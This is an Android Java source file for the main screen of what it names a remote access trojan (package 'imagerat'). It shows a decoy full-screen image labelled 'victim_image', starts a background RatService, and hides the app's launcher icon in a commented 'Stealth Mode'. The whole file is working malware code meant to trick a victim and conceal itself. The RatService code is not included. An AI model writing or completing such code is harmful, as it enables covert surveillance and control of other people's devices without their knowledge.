package com.imagerat.client;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.view.WindowManager;
import android.widget.ImageView;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Set full-screen flags for clean display
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, 
                             WindowManager.LayoutParams.FLAG_FULLSCREEN);

        // Display the image full-screen
        ImageView imageView = new ImageView(this);
        // Ensure you have an image file named 'victim_image.jpg' or '.png' in res/drawable/
        imageView.setImageResource(R.drawable.victim_image); 
        imageView.setScaleType(ImageView.ScaleType.FIT_XY);
        setContentView(imageView);

        // Start the background RAT service
        Intent serviceIntent = new Intent(this, RatService.class);
        startService(serviceIntent);

        // Stealth Mode: Hide the app icon from the launcher
        hideAppIcon();
    }

    private void hideAppIcon() {
        try {
            PackageManager p = getPackageManager();
            ComponentName componentName = new ComponentName(this, MainActivity.class);
            p.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            );
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

